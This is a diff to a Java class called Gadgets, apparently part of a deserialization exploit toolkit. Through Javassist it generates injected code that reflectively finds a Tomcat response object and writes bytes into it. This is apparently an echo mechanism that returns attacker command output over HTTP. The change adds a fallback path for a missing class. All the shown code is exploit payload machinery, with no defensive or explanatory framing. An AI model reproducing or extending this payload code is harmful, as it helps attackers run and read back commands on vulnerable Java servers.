@@ -154,13 +154,16 @@ public class Gadgets {
             "        o = clazz.newInstance();\n" +
             "        clazz.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(o, new Object[]{bs, new Integer(0), new Integer(bs.length)});\n" +
             "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
+            "    } catch (ClassNotFoundException e) {\n" +
+            "        clazz = Class.forName(\"java.nio.ByteBuffer\");\n" +
+            "        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});\n" +
+            "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
             "    } catch (NoSuchMethodException e) {\n" +
-            "        // tomcat9 nio\n" +
             "        clazz = Class.forName(\"java.nio.ByteBuffer\");\n" +
             "        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});\n" +
             "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
             "    }\n" +
-            "}\n", clazz));
+            "}", clazz));
         clazz.addMethod(CtMethod.make("private static Object getFV(Object o, String s) throws Exception {\n" +
             "    java.lang.reflect.Field f = null;\n" +
             "    Class clazz = o.getClass();\n" +
